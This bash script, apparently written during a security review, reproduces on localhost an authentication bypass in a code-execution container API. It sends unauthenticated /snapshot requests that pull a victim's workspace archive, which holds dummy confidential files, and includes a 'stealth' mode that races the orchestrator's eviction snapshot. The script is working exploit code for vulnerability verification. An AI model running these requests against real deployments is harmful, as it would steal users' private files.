#!/usr/bin/env bash
# Independent local reproduction for candidate L2-cee-snapshot-auth-bypass.
# Runs the unmodified code-execution-environment api-server + executor (only
# filesystem path constants changed) behind tfshim configured with the same
# `paths` list as code-execution-environment/tinfoil-config.yml. Local only.
#
# Usage: poc.sh noisy|stealth
set -u
MODE=${1:-noisy}
W=/root/.claude/jobs/632f70ea/tmp/work/verify3-L2-cee-snapshot-auth-bypass-impact
R=$W/root
BIN=$W/bin
OUT=$W/out-$MODE-large
rm -rf "$OUT"; mkdir -p "$OUT" "$W/shim"
rm -rf "$R"/workspace/* "$R"/user-uploads/* "$R"/run/execsock/* 2>/dev/null
chmod 1777 "$R/workspace"

cat > "$W/shim/shim.yml" <<EOF
listen-port: 18543
upstream-port: 8000
tls-mode: self-signed
hpke-key-file: $W/shim/hpke_key.json
cache-dir: $W/shim/cache
paths:
  - /exec
  - /read
  - /write
  - /snapshot
  - /restore
  - /sync-uploads/manifest
  - /sync-uploads/blobs
  - /health
EOF
printf 'env:\n  DOMAIN: localhost\n' > "$W/shim/external.yml"

"$BIN/executor"   > "$OUT/executor.log" 2>&1 & EXEC_PID=$!
sleep 0.5
"$BIN/api-server" > "$OUT/api-server.log" 2>&1 & API_PID=$!
"$BIN/tfshim" -c "$W/shim/shim.yml" -e "$W/shim/external.yml" > "$OUT/shim.log" 2>&1 & SHIM_PID=$!
trap 'kill $EXEC_PID $API_PID $SHIM_PID 2>/dev/null' EXIT
for i in $(seq 1 100); do curl -sk -o /dev/null https://localhost:18543/health && break; sleep 0.2; done

S=https://localhost:18543
H='Content-Type: application/json'
TOK=$(python3 -c 'import secrets;print(secrets.token_hex(32))')   # per-chat containerAuthToken (HKDF of user key in prod)
b64() { printf '%s' "$1" | base64 -w0; }

echo "=== [attacker] probe /snapshot while container is WARM (no token) ==="
curl -sk -X POST $S/snapshot -w '  HTTP %{http_code}\n'

echo "=== [orchestrator, victim token] /restore previous workspace (allowed only while warm) ==="
PREV_TAR=$(python3 -I - <<'PY'
import tarfile, io, base64
b = io.BytesIO()
with tarfile.open(fileobj=b, mode="w") as t:
    data = b"Patient: Jane Doe\nDiagnosis: <confidential>\n"
    ti = tarfile.TarInfo("notes/medical_record.txt"); ti.size = len(data)
    t.addfile(ti, io.BytesIO(data))
print(base64.b64encode(b.getvalue()).decode())
PY
)
curl -sk -X POST $S/restore -H "$H" -H "X-Code-Execution-Container-Auth-Token: $TOK" -d "{\"tar\":\"$PREV_TAR\"}" -w '  HTTP %{http_code}\n'

echo "=== [orchestrator, victim token] /write files during the session ==="
curl -sk -o /dev/null -X POST $S/write -H "$H" -H "X-Code-Execution-Container-Auth-Token: $TOK" \
  -d "{\"path\":\"out/report.txt\",\"contents\":\"$(b64 'q3 revenue forecast: 12.4M (draft, do not share)')\"}" -w '  write report.txt HTTP %{http_code}\n'
if [ "$MODE" = stealth ]; then
  # ~3 MB of incompressible data so a throttled transfer stays in flight for a few seconds
  python3 -c 'import os,base64,json;print(json.dumps({"path":"data/big.bin","contents":base64.b64encode(os.urandom(48*1024*1024)).decode()}))' > "$OUT/big.json"
  curl -sk -o /dev/null -X POST $S/write -H "$H" -H "X-Code-Execution-Container-Auth-Token: $TOK" --data-binary @"$OUT/big.json" -w '  write big.bin HTTP %{http_code}\n'
fi

echo "=== [attacker] /read without token / with wrong token ==="
curl -sk -X POST $S/read -H "$H" -d '{"path":"out/report.txt"}' -w '  HTTP %{http_code}\n'
curl -sk -X POST $S/read -H "$H" -H "X-Code-Execution-Container-Auth-Token: attacker" -d '{"path":"out/report.txt"}' -w '  HTTP %{http_code}\n'

dump() {  # list + print small files in a snapshot JSON
python3 -I - "$1" <<'PY'
import sys, json, base64, tarfile, io
try:
    d = json.load(open(sys.argv[1]))
except Exception as e:
    print("   (not valid snapshot JSON:", e, ")"); sys.exit()
t = tarfile.open(fileobj=io.BytesIO(base64.b64decode(d["tar"])))
for m in t.getmembers():
    if m.isfile():
        data = t.extractfile(m).read()
        print(f"   --- {m.name} ({len(data)} bytes) ---")
        if len(data) < 200: print("   " + data.decode().replace("\n", "\n   "))
PY
}

if [ "$MODE" = noisy ]; then
  echo "=== [attacker] POST /snapshot with NO token (container ACTIVE) ==="
  curl -sk -X POST $S/snapshot -o "$OUT/stolen.json" -w '  HTTP %{http_code}, %{size_download} bytes\n'
  dump "$OUT/stolen.json"
  echo "=== [orchestrator, victim token] next call ==="
  curl -sk -X POST $S/read -H "$H" -H "X-Code-Execution-Container-Auth-Token: $TOK" -d '{"path":"out/report.txt"}' -w '  HTTP %{http_code}\n'
  echo "=== [orchestrator] later eviction snapshot ==="
  curl -sk -X POST $S/snapshot -o /dev/null -w '  HTTP %{http_code}\n'
else
  echo "=== [orchestrator] eviction /snapshot (throttled link, e.g. host-delayed) + [attacker] concurrent /snapshot ==="
  ( curl -sk -X POST $S/snapshot --limit-rate 4M -o "$OUT/orchestrator.json" -w '  orchestrator: HTTP %{http_code}, %{size_download} bytes, %{time_total}s\n' ) & OP=$!
  sleep 1
  curl -sk -X POST $S/snapshot -o "$OUT/stolen.json" -w '  attacker:     HTTP %{http_code}, %{size_download} bytes, %{time_total}s\n'
  wait $OP
  echo "  orchestrator copy:"; dump "$OUT/orchestrator.json"
  echo "  attacker copy:";     dump "$OUT/stolen.json"
  cmp <(python3 -I -c 'import json,sys;print(json.load(open(sys.argv[1]))["tar"])' "$OUT/orchestrator.json") \
      <(python3 -I -c 'import json,sys;print(json.load(open(sys.argv[1]))["tar"])' "$OUT/stolen.json") && echo "  => attacker tar is byte-identical to the orchestrator's eviction snapshot"
  echo "=== container state after eviction (expected killed) ==="
  curl -sk -X POST $S/read -H "$H" -H "X-Code-Execution-Container-Auth-Token: $TOK" -d '{"path":"out/report.txt"}' -w '  HTTP %{http_code}\n'
fi
echo "=== api-server log ==="; cat "$OUT/api-server.log"
